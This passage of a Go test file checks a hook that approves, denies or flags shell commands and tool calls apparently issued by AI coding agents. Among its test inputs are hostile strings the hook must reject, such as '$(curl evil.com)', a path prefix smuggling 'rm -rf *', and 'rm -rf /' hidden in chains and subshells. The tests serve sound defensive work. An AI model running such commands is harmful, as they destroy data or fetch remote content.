		{"group disabled", []string{"git read op", "git"}, Config{Disabled: []string{"git"}}, false},
		{"group not mentioned", []string{"cargo", "rust"}, Config{Enabled: []string{"git"}}, false},

		// fine name (first tag) overrides group (second tag)
		{"fine enabled overrides group disabled", []string{"git read op", "git"},
			Config{Enabled: []string{"git read op"}, Disabled: []string{"git"}}, true},
		{"fine disabled overrides group enabled", []string{"git write op", "git"},
			Config{Enabled: []string{"git"}, Disabled: []string{"git write op"}}, false},

		// fine name overrides "all"
		{"fine disabled overrides all enabled", []string{"git write op", "git"},
			Config{Enabled: []string{"all"}, Disabled: []string{"git write op"}}, false},
		{"fine enabled overrides all disabled", []string{"git read op", "git"},
			Config{Enabled: []string{"git read op"}, Disabled: []string{"all"}}, true},

		// group overrides "all"
		{"group disabled overrides all enabled", []string{"cargo", "rust"},
			Config{Enabled: []string{"all"}, Disabled: []string{"rust"}}, false},
		{"group enabled overrides all disabled", []string{"cargo", "rust"},
			Config{Enabled: []string{"rust"}, Disabled: []string{"all"}}, true},

		// not mentioned at all -> disabled
		{"nothing mentioned", []string{"cargo", "rust"}, Config{}, false},

		// empty config
		{"empty config", []string{"git read op", "git"}, Config{}, false},

		// single tag (no group)
		{"single tag enabled", []string{"make"}, Config{Enabled: []string{"make"}}, true},
		{"single tag via all", []string{"make"}, Config{Enabled: []string{"all"}}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isEnabled(tt.tags, toSet(tt.cfg.Enabled), toSet(tt.cfg.Disabled))
			assert.Equal(t, tt.wantResult, got, "isEnabled(%v, %+v)", tt.tags, tt.cfg)
		})
	}
}

func TestBuildActivePatterns(t *testing.T) {
	t.Run("all enabled returns everything", func(t *testing.T) {
		cfg := Config{Enabled: []string{"all"}}
		wrappers, commands := buildActivePatterns(cfg)
		assert.Len(t, wrappers, len(wrapperPatterns()))
		assert.Len(t, commands, len(commandPatterns()))
	})

	t.Run("only git enabled", func(t *testing.T) {
		cfg := Config{Enabled: []string{"git"}}
		wrappers, commands := buildActivePatterns(cfg)
		assert.Empty(t, wrappers)
		require.NotEmpty(t, commands, "expected some git commands")
		for _, c := range commands {
			assert.True(t, slices.Contains(c.tags, "git"),
				"unexpected command in git-only config: %q (tags %v)", c.label(), c.tags)
		}
	})

	t.Run("all enabled but git write op disabled", func(t *testing.T) {
		cfg := Config{Enabled: []string{"all"}, Disabled: []string{"git write op"}}
		_, commands := buildActivePatterns(cfg)
		for _, c := range commands {
			assert.NotEqual(t, "git write op", c.label(), "git write op should be filtered out")
		}
		found := false
		for _, c := range commands {
			if c.label() == "git read op" {
				found = true
				break
			}
		}
		assert.True(t, found, "git read op should still be present")
	})

	t.Run("nothing enabled", func(t *testing.T) {
		cfg := Config{}
		wrappers, commands := buildActivePatterns(cfg)
		assert.Empty(t, wrappers)
		assert.Empty(t, commands)
	})
}

func TestEvaluateWithRestrictedConfig(t *testing.T) {
	t.Run("git only: git diff approved", func(t *testing.T) {
		cfg := Config{Enabled: []string{"git", "wrapper"}}
		wrappers, commands := buildActivePatterns(cfg)
		r := evaluate("git diff", evalContext{}, wrappers, commands)
		require.NotNil(t, r, "expected git diff to be approved with git enabled")
		assert.Equal(t, "git read op", r.reason)
	})

	t.Run("git only: cargo build rejected", func(t *testing.T) {
		cfg := Config{Enabled: []string{"git", "wrapper"}}
		wrappers, commands := buildActivePatterns(cfg)
		r := evaluate("cargo build", evalContext{}, wrappers, commands)
		assert.Nil(t, r, "expected cargo build to be rejected with only git enabled")
	})

	t.Run("all enabled except git write: git commit rejected", func(t *testing.T) {
		cfg := Config{Enabled: []string{"all"}, Disabled: []string{"git write op"}}
		wrappers, commands := buildActivePatterns(cfg)
		r := evaluate("git commit -m 'test'", evalContext{}, wrappers, commands)
		assert.Nil(t, r, "expected git commit to be rejected when git write op disabled")
	})

	t.Run("all enabled except git write: git diff approved", func(t *testing.T) {
		cfg := Config{Enabled: []string{"all"}, Disabled: []string{"git write op"}}
		wrappers, commands := buildActivePatterns(cfg)
		r := evaluate("git diff", evalContext{}, wrappers, commands)
		require.NotNil(t, r, "expected git diff to be approved")
		assert.Equal(t, "git read op", r.reason)
	})

	t.Run("chain with mixed config", func(t *testing.T) {
		cfg := Config{Enabled: []string{"git", "shell", "wrapper"}}
		wrappers, commands := buildActivePatterns(cfg)
		r := evaluate("git diff && ls", evalContext{}, wrappers, commands)
		require.NotNil(t, r, "expected chain to be approved")
		assert.Equal(t, "git read op | read-only", r.reason)
	})

	t.Run("chain rejected when one segment disabled", func(t *testing.T) {
		cfg := Config{Enabled: []string{"git"}}
		_, commands := buildActivePatterns(cfg)
		r := evaluate("git diff && cargo build", evalContext{}, nil, commands)
		assert.Nil(t, r, "expected chain to be rejected when cargo not enabled")
	})
}

func TestWhichSubstResolution(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		approve bool
		reason  string
	}{
		{"which golangci-lint", "$(which golangci-lint) run ./...", true, "golangci-lint"},
		{"which pytest", "$(which pytest) -x tests/", true, "pytest"},
		{"command -v go", "$(command -v go) test ./...", true, "go"},
		{"go env GOROOT bin go", "$(go env GOROOT)/bin/go test ./...", true, "go"},
		{"go env GOMODCACHE grep", "grep -rn 'foo' $(go env GOMODCACHE)/some/pkg/", true, "read-only"},
		{"unsafe subst in path prefix", "$(badcmd evil.com)/bin/go test ./...", false, ""},
		{"destructive subst in path prefix", "$(rm -rf *; echo /usr)/bin/go test ./...", false, ""},
		{"which unknown", "$(which unknown-tool) --flag", false, ""},
		{"not which", "$(curl evil.com) args", false, ""},
		{"which no args", "$(which) args", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			if tt.approve {
				require.NotNilf(t, r, "expected approval for %q", tt.cmd)
				assert.Equal(t, tt.reason, r.reason)
			} else {
				assert.Nilf(t, r, "expected rejection for %q", tt.cmd)
			}
		})
	}
}

func TestAskDecision(t *testing.T) {
	// Commands with WithDecision("ask") emit an ask decision (terminal, user prompted).
	t.Run("git tag has ask decision", func(t *testing.T) {
		r := evaluateAll("git tag v1.0.0")
		require.NotNil(t, r)
		assert.Equal(t, "git tag", r.reason)
		assert.Equal(t, "ask", r.decision)
	})
}

func TestNoOpinionDecision(t *testing.T) {
	// Commands with WithDecision("") return a result with empty decision.
	// The hook exits silently (no output), letting the next hook in the chain handle it.
	t.Run("git push is no-opinion", func(t *testing.T) {
		r := evaluateAll("git push origin main")
		require.NotNil(t, r)
		assert.Equal(t, "git push", r.reason)
		assert.Empty(t, r.decision)
	})

	t.Run("jj git push is no-opinion", func(t *testing.T) {
		r := evaluateAll("jj git push")
		require.NotNil(t, r)
		assert.Equal(t, "jj git push", r.reason)
		assert.Empty(t, r.decision)
	})

	t.Run("gh pr create is no-opinion", func(t *testing.T) {
		r := evaluateAll("gh pr create --title 'fix'")
		require.NotNil(t, r)
		assert.Equal(t, "gh pr create", r.reason)
		assert.Empty(t, r.decision)
	})

	t.Run("go mod init is no-opinion", func(t *testing.T) {
		r := evaluateAll("go mod init github.com/example/repo")
		require.NotNil(t, r)
		assert.Equal(t, "go mod init", r.reason)
		assert.Empty(t, r.decision)
	})

	t.Run("go mod vendor has deny decision with reason", func(t *testing.T) {
		r := evaluateAll("go mod vendor")
		require.NotNil(t, r)
		assert.Equal(t, "go mod vendor", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "go mod vendor is banned")
	})

	t.Run("chain with deny propagates deny and reason", func(t *testing.T) {
		r := evaluateAll("go mod tidy && go mod vendor")
		require.NotNil(t, r)
		assert.Equal(t, "deny", r.decision, "chain containing go mod vendor should have deny decision")
		assert.Contains(t, r.denyReason, "go mod vendor is banned")
	})

	t.Run("roborev tui has deny decision with reason", func(t *testing.T) {
		r := evaluateAll("roborev tui")
		require.NotNil(t, r)
		assert.Equal(t, "roborev tui", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "interactive TUI")
	})

	// --- git destructive ops (deny) ---
	t.Run("git stash denied with reason", func(t *testing.T) {
		r := evaluateAll("git stash")
		require.NotNil(t, r)
		assert.Equal(t, "git stash", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "git stash is banned")
	})

	t.Run("git stash push denied", func(t *testing.T) {
		r := evaluateAll("git stash push -m 'wip'")
		require.NotNil(t, r)
		assert.Equal(t, "git stash", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("git stash pop denied", func(t *testing.T) {
		r := evaluateAll("git stash pop")
		require.NotNil(t, r)
		assert.Equal(t, "git stash", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("git stash list still allowed", func(t *testing.T) {
		r := evaluateAll("git stash list")
		require.NotNil(t, r)
		assert.Equal(t, "git read op", r.reason)
		assert.Equal(t, "allow", r.decision)
	})

	t.Run("git revert denied with reason", func(t *testing.T) {
		r := evaluateAll("git revert HEAD")
		require.NotNil(t, r)
		assert.Equal(t, "git revert", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "git revert is banned")
	})

	t.Run("git reset --hard denied with reason", func(t *testing.T) {
		r := evaluateAll("git reset --hard HEAD~1")
		require.NotNil(t, r)
		assert.Equal(t, "git reset --hard", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "git reset --hard is banned")
	})

	t.Run("git -C path reset --hard denied", func(t *testing.T) {
		r := evaluateAll("git -C /repo reset --hard")
		require.NotNil(t, r)
		assert.Equal(t, "git reset --hard", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("git checkout . denied with reason", func(t *testing.T) {
		r := evaluateAll("git checkout .")
		require.NotNil(t, r)
		assert.Equal(t, "git checkout .", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "blanket git checkout is banned")
	})

	t.Run("git checkout -- . denied", func(t *testing.T) {
		r := evaluateAll("git checkout -- .")
		require.NotNil(t, r)
		assert.Equal(t, "git checkout .", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("git checkout branch still allowed", func(t *testing.T) {
		r := evaluateAll("git checkout main")
		require.NotNil(t, r)
		assert.Equal(t, "git write op", r.reason)
		assert.Equal(t, "allow", r.decision)
	})

	t.Run("git clean -f denied with reason", func(t *testing.T) {
		r := evaluateAll("git clean -f")
		require.NotNil(t, r)
		assert.Equal(t, "git clean -f", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "git clean -f is banned")
	})

	t.Run("git clean -fd denied", func(t *testing.T) {
		r := evaluateAll("git clean -fd")
		require.NotNil(t, r)
		assert.Equal(t, "git clean -f", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("git -C path clean -f denied", func(t *testing.T) {
		r := evaluateAll("git -C /repo clean -fd")
		require.NotNil(t, r)
		assert.Equal(t, "git clean -f", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	// --- shell destructive ops (deny) ---
	t.Run("rm -rf denied", func(t *testing.T) {
		r := evaluateAll("rm -rf /tmp/stuff")
		require.NotNil(t, r)
		assert.Equal(t, "rm -r", r.reason)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "rm -r is banned")
	})

	t.Run("rm -r denied", func(t *testing.T) {
		r := evaluateAll("rm -r dir/")
		require.NotNil(t, r)
		assert.Equal(t, "rm -r", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("rm -fr denied", func(t *testing.T) {
		r := evaluateAll("rm -fr dir/")
		require.NotNil(t, r)
		assert.Equal(t, "rm -r", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("rm --recursive denied", func(t *testing.T) {
		r := evaluateAll("rm --recursive dir/")
		require.NotNil(t, r)
		assert.Equal(t, "rm -r", r.reason)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("rm single file is not denied", func(t *testing.T) {
		r := evaluateAll("rm file.txt")
		assert.Nil(t, r, "plain rm should be no-opinion, not denied")
	})

	t.Run("chain safe && rm -rf denied", func(t *testing.T) {
		r := evaluateAll("git status && rm -rf /")
		require.NotNil(t, r)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("if clause with rm -rf denied", func(t *testing.T) {
		r := evaluateAll("if true; then rm -rf /; fi")
		require.NotNil(t, r)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("subshell with rm -rf denied", func(t *testing.T) {
		r := evaluateAll("(rm -rf /)")
		require.NotNil(t, r)
		assert.Equal(t, "deny", r.decision)
	})

	t.Run("chain with git destructive propagates deny and reason", func(t *testing.T) {
		r := evaluateAll("git add . && git reset --hard")
		require.NotNil(t, r)
		assert.Equal(t, "deny", r.decision)
		assert.Contains(t, r.denyReason, "git reset --hard is banned")
	})

	t.Run("git diff has allow decision", func(t *testing.T) {
		r := evaluateAll("git diff")
		require.NotNil(t, r)
		assert.Equal(t, "allow", r.decision)
	})

	t.Run("chain with no-opinion propagates no-opinion", func(t *testing.T) {
		r := evaluateAll("git add . && git push origin main")
		require.NotNil(t, r)
		assert.Empty(t, r.decision, "chain containing git push should have no-opinion decision")
	})

	t.Run("multiline with no-opinion propagates no-opinion", func(t *testing.T) {
		r := evaluateAll("git add .\ngit push origin main")
		require.NotNil(t, r)
		assert.Empty(t, r.decision, "multiline containing git push should have no-opinion decision")
	})

	t.Run("chain with ask propagates ask", func(t *testing.T) {
		r := evaluateAll("git add . && git tag v1.0.0")
		require.NotNil(t, r)
		assert.Equal(t, "ask", r.decision, "chain containing git tag should have ask decision")
	})

}

func TestCDApproval_CurrentRepoWorktreesOnly(t *testing.T) {
	repo := initGitRepo(t)
	linkedWorktree := filepath.Join(t.TempDir(), "feature-worktree")
	runGit(t, repo, "worktree", "add", "-b", "feature", linkedWorktree, "HEAD")
	require.NoError(t, os.MkdirAll(filepath.Join(repo, "frontend"), 0o755))

	t.Run("linked worktree from same repo is approved", func(t *testing.T) {
		r := evaluateAllInDir("cd "+linkedWorktree, repo)
		require.NotNil(t, r)
		assert.Equal(t, "cd", r.reason)
		assert.Equal(t, decisionAllow, r.decision)
	})

	t.Run("relative path to linked worktree is approved", func(t *testing.T) {
		relativePath, err := filepath.Rel(repo, linkedWorktree)
		require.NoError(t, err)
		r := evaluateAllInDir("cd "+relativePath, repo)
		require.NotNil(t, r)
		assert.Equal(t, "cd", r.reason)
		assert.Equal(t, decisionAllow, r.decision)
	})

	t.Run("repo subdir is approved", func(t *testing.T) {
		r := evaluateAllInDir("cd frontend", repo)
		require.NotNil(t, r)
		assert.Equal(t, "cd", r.reason)
		assert.Equal(t, decisionAllow, r.decision)
	})

	t.Run("unrelated directory is no-opinion", func(t *testing.T) {
		otherDir := t.TempDir()
		r := evaluateAllInDir("cd "+otherDir, repo)
		require.NotNil(t, r)
		assert.Equal(t, "cd", r.reason)
		assert.Empty(t, r.decision)
	})

	t.Run("non repo cwd is no-opinion", func(t *testing.T) {
		nonRepo := t.TempDir()
		r := evaluateAllInDir("cd "+linkedWorktree, nonRepo)
		require.NotNil(t, r)
		assert.Equal(t, "cd", r.reason)
		assert.Empty(t, r.decision)
	})
}

func TestEvaluateToolUse_ReadAndGrepRepoScoped(t *testing.T) {
	repo := initGitRepo(t)
	repoFile := filepath.Join(repo, "inside.txt")
	require.NoError(t, os.WriteFile(repoFile, []byte("inside\n"), 0644))
	outsideFile := filepath.Join(t.TempDir(), "outside.txt")
	require.NoError(t, os.WriteFile(outsideFile, []byte("outside\n"), 0644))

	cfg := Config{Enabled: []string{"all"}}

	t.Run("read inside repo is allowed", func(t *testing.T) {
		input := HookInput{
			ToolName:  "Read",
			ToolInput: mustMarshalJSON(t, map[string]any{"file_path": repoFile}),
			Cwd:       repo,
		}
		cmd, r := evaluateToolUse(input, cfg)
		require.NotNil(t, r)
		assert.Equal(t, repoFile, cmd)
		assert.Equal(t, "read", r.reason)
		assert.Equal(t, decisionAllow, r.decision)
	})

	t.Run("read outside repo is no-opinion", func(t *testing.T) {
		input := HookInput{
			ToolName:  "Read",
			ToolInput: mustMarshalJSON(t, map[string]any{"file_path": outsideFile}),
			Cwd:       repo,
		}
		cmd, r := evaluateToolUse(input, cfg)
		require.NotNil(t, r)
		assert.Equal(t, outsideFile, cmd)
		assert.Equal(t, "read", r.reason)
		assert.Empty(t, r.decision)
	})

	t.Run("grep inside repo path is allowed", func(t *testing.T) {
		input := HookInput{
			ToolName:  "Grep",
			ToolInput: mustMarshalJSON(t, map[string]any{"pattern": "inside", "path": repo}),
			Cwd:       repo,
		}
		cmd, r := evaluateToolUse(input, cfg)
		require.NotNil(t, r)
		assert.Equal(t, repo, cmd)
		assert.Equal(t, "grep", r.reason)
		assert.Equal(t, decisionAllow, r.decision)
	})

	t.Run("grep outside repo path is no-opinion", func(t *testing.T) {
		input := HookInput{
			ToolName:  "Grep",
			ToolInput: mustMarshalJSON(t, map[string]any{"pattern": "outside", "path": filepath.Dir(outsideFile)}),
			Cwd:       repo,
		}
		cmd, r := evaluateToolUse(input, cfg)
		require.NotNil(t, r)
		assert.Equal(t, filepath.Dir(outsideFile), cmd)
		assert.Equal(t, "grep", r.reason)
		assert.Empty(t, r.decision)
	})
}

func TestEvaluateOpenCodeToolUse_Bash(t *testing.T) {
	cfg := Config{Enabled: []string{"all"}}

	t.Run("bash command is evaluated", func(t *testing.T) {
		input := OpenCodeInput{
			Tool:    "bash",
			Command: "git status",
			Cwd:     t.TempDir(),
		}

		cmd, r := evaluateOpenCodeToolUse(input, cfg)
		require.NotNil(t, r)
		assert.Equal(t, "git status", cmd)
		assert.Equal(t, "git read op", r.reason)
		assert.Equal(t, decisionAllow, r.decision)
	})

	t.Run("unsupported tool is ignored", func(t *testing.T) {
		cmd, r := evaluateOpenCodeToolUse(OpenCodeInput{Tool: "read", Command: "foo"}, cfg)
		assert.Empty(t, cmd)
		assert.Nil(t, r)
	})
}

func TestBuildOpenCodeOutput(t *testing.T) {
	t.Run("allow decision is preserved", func(t *testing.T) {
		out := buildOpenCodeOutput(&result{decision: decisionAllow, reason: "git read op"})
		assert.Equal(t, OpenCodeOutput{Decision: decisionAllow, Reason: "git read op"}, out)
	})

	t.Run("deny prefers human deny reason", func(t *testing.T) {
		out := buildOpenCodeOutput(&result{decision: decisionDeny, reason: "git destructive", denyReason: "destructive git command"})
		assert.Equal(t, OpenCodeOutput{Decision: decisionDeny, Reason: "destructive git command"}, out)
	})

	t.Run("ask decision is preserved", func(t *testing.T) {
		out := buildOpenCodeOutput(&result{decision: decisionAsk, reason: "git tag"})
		assert.Equal(t, OpenCodeOutput{Decision: decisionAsk, Reason: "git tag"}, out)
	})

	t.Run("no decision becomes noop", func(t *testing.T) {
		out := buildOpenCodeOutput(&result{reason: "unknown"})
		assert.Equal(t, OpenCodeOutput{Decision: "noop", Reason: "unknown"}, out)
	})

	t.Run("nil result becomes noop", func(t *testing.T) {
		out := buildOpenCodeOutput(nil)
		assert.Equal(t, OpenCodeOutput{Decision: "noop"}, out)
	})
}

func writeTestConfig(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "categories.yaml")
	require.NoError(t, os.WriteFile(path, []byte(content), 0644))
	return path
}

func TestLoadConfigFromPath(t *testing.T) {
	t.Run("missing file returns all enabled", func(t *testing.T) {
		cfg, err := loadConfigFromPath("/nonexistent/categories.yaml")
		require.NoError(t, err)
		assert.Equal(t, []string{"all"}, cfg.Enabled)
	})

	t.Run("empty file defaults to all enabled", func(t *testing.T) {
		path := writeTestConfig(t, "")
		cfg, err := loadConfigFromPath(path)
		require.NoError(t, err)
		assert.Equal(t, []string{"all"}, cfg.Enabled)
	})

	t.Run("comments-only file defaults to all enabled", func(t *testing.T) {
		path := writeTestConfig(t, "# just comments\n# nothing else\n")
		cfg, err := loadConfigFromPath(path)
		require.NoError(t, err)
		assert.Equal(t, []string{"all"}, cfg.Enabled)
	})

	t.Run("invalid yaml returns error", func(t *testing.T) {
		path := writeTestConfig(t, "{{invalid yaml")
		_, err := loadConfigFromPath(path)
		assert.Error(t, err)
	})

	t.Run("valid config parsed", func(t *testing.T) {
		path := writeTestConfig(t, "enabled:\n  - git\n  - python\ndisabled:\n  - git write op\n")
		cfg, err := loadConfigFromPath(path)
		require.NoError(t, err)
		assert.Equal(t, []string{"git", "python"}, cfg.Enabled)
		assert.Equal(t, []string{"git write op"}, cfg.Disabled)
	})

	t.Run("only enabled specified", func(t *testing.T) {
		path := writeTestConfig(t, "enabled:\n  - all\n")
		cfg, err := loadConfigFromPath(path)
		require.NoError(t, err)
		assert.Equal(t, []string{"all"}, cfg.Enabled)
		assert.Empty(t, cfg.Disabled)
	})

	t.Run("unreadable file returns error", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "categories.yaml")
		require.NoError(t, os.WriteFile(path, []byte("enabled:\n  - all\n"), 0000))
		_, err := loadConfigFromPath(path)
		assert.Error(t, err)
	})
}

func TestPatternTagsNonEmpty(t *testing.T) {
	allPatterns := append(wrapperPatterns(), commandPatterns()...)
	for _, p := range allPatterns {
		assert.NotEmpty(t, p.tags, "pattern with regex %v has no tags", p.re)
	}
}

func TestNoOverlappingPatterns(t *testing.T) {
	commands := []string{
		"git diff", "git add .", "git grep TODO", "git push origin main",
		"pytest -x", "python main.py", "ruff check .",
		"uv sync", "uvx black",
		"npm install", "npx prettier",
		"cargo build", "maturin develop",
		"make", "ls -la", "grep -r TODO",
		"touch foo", "true", "kill 123", "echo hi",
		"cd /tmp", "source .venv/bin/activate", "sleep 5",
		"FOO=bar",
		"gh pr view 1", "gh pr create --title x", "gh api repos/x/y",
		"go test ./...", "bq ls", "gcloud logging read 'severity=ERROR'",
		"gcloud compute instances list", "gcloud auth print-access-token",
		"acli jira list", "roborev status",
		"rspec spec/", "rake test", "ruby -e 1", "rails test",
		"bundle install", "gem list", "rubocop", "solargraph check", "standardrb",
	}

	for _, cmd := range commands {
		var matches []string
		for _, sc := range commandPatterns() {
			if sc.re.MatchString(cmd) {
				matches = append(matches, sc.label())
			}
		}
		assert.LessOrEqualf(t, len(matches), 1,
			"command %q matches multiple patterns: %v", cmd, matches)
	}
}

func TestHookInputDeserialization(t *testing.T) {
	tests := []struct {
		name    string
		json    string
		command string
		timeout int
	}{
		{"command only", `{"tool_name":"Bash","tool_input":{"command":"echo hello"}}`, "echo hello", 0},
		{"with timeout", `{"tool_name":"Bash","tool_input":{"command":"echo hello","timeout":600000}}`, "echo hello", 600000},
		{"with all fields", `{"tool_name":"Bash","tool_input":{"command":"npm test","description":"Run tests","timeout":120000,"run_in_background":false}}`, "npm test", 120000},
		{"with extra fields", `{"tool_name":"Bash","tool_input":{"command":"ls"},"session_id":"abc","cwd":"/tmp","permission_mode":"default"}`, "ls", 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var input HookInput
			err := json.Unmarshal([]byte(tt.json), &input)
			assert.NoError(t, err)
			assert.Equal(t, "Bash", input.ToolName)
			var bashInput BashInput
			require.NoError(t, json.Unmarshal(input.ToolInput, &bashInput))
			assert.Equal(t, tt.command, bashInput.Command)
			assert.Equal(t, tt.timeout, bashInput.Timeout)
		})
	}
}

// reasonOrEmpty safely extracts reason from a possibly-nil result.
func reasonOrEmpty(r *result) string {
	if r == nil {
		return ""
	}
	return r.reason
}

func initGitRepo(t *testing.T) string {
	t.Helper()
	repo := t.TempDir()
	runGit(t, repo, "init")
	runGit(t, repo, "config", "user.email", "test@example.com")
	runGit(t, repo, "config", "user.name", "Test User")
	require.NoError(t, os.WriteFile(filepath.Join(repo, "README.md"), []byte("test\n"), 0644))
	runGit(t, repo, "add", "README.md")
	runGit(t, repo, "commit", "-m", "init")
	return repo
}

func runGit(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	require.NoErrorf(t, err, "git %v failed: %s", args, string(out))
	return string(out)
}

func mustMarshalJSON(t *testing.T, value any) json.RawMessage {
	t.Helper()
	data, err := json.Marshal(value)
	require.NoError(t, err)
	return data
}
